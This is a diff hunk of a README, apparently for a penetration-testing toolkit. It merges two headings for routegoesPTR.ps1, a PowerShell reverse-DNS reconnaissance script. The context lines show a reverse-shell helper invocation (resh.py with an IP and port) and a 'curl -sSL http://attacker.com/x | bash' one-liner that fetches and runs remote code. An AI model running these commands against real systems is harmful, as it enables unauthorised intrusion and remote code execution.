@@ -331,9 +331,7 @@ python3 resh.py 10.10.10.10 4444 x
 curl -sSL http://attacker.com/x | bash
 ```
 
-## [routegoesPTR.ps1](./routegoesPTR.ps1)
-
-## Reverse DNS Lookup and Network Discovery Tool
+## [routegoesPTR.ps1](./routegoesPTR.ps1) - Reverse DNS Lookup and Network Discovery Tool
 
 `routegoesPTR.ps1` is a PowerShell script designed to assist in network reconnaissance by performing reverse DNS lookups on selected network routes. This tool is particularly useful when you have a VPN connection to a target network and want to discover hostnames and gain insights into the systems accessible via available routes. By mapping IP addresses to hostnames, you can get a better understanding of the network infrastructure and identify potential systems for further exploration.
 
